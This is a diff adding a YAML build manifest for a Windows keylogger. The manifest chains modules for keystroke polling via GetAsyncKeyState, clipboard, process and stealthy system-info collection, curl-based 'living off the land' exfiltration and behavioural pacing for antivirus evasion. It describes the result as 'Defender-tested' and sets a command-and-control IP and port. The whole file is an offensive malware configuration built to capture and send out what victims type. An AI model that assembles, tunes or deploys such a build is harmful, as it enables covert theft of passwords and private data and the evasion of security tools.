@@ -1,0 +1,25 @@
+name: keylogger_poll
+description: GetAsyncKeyState keylogger — clean 3-DLL IAT, LOLBin exfil, Defender-tested
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+
+collectors:
+  - collectors/system_info_stealth
+  - collectors/processes
+  - collectors/clipboard
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/curl_lolbin
+arch: arch/keylogger
+
+evasion:
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  FLUSH_INTERVAL_MS: "30000"
+  BATCH_DURATION_MS: "30000"
